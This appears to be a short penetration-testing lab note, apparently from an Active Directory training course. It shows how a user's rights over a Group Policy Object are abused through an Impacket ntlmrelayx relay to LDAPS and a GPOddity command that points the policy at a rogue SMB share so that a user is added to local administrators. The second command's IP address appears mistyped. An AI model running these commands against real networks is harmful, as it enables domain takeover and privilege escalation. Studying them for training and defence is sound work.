The user **DEVOPSADMIN** has permissions over **DEVOPS POLICY**

![[objective6-bloodhound.png]]

That can change the value of the parameter **`gpcfilesyspath`** 

![[objective6-powerview.png]]

Then we'll do **Relay Attack** using the **Impacket Ntlmrelayx** tool

```shell
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.1 -http-port '80,8080' -i 
--no-smb-server
```

Then

```sh
sudo python3 gpoddity.py --gpo-id 'ID' --domain 'dollarcorp.moneycorp.local' --username 'student1' --password something --command 'net localgroup administrators student1 /add' --rogue-smbserver-ip '72.16.100.1' --rogue-smbserver-share 'std1-gp' -dc-ip 172.16.2.1 --smb-mode none
```

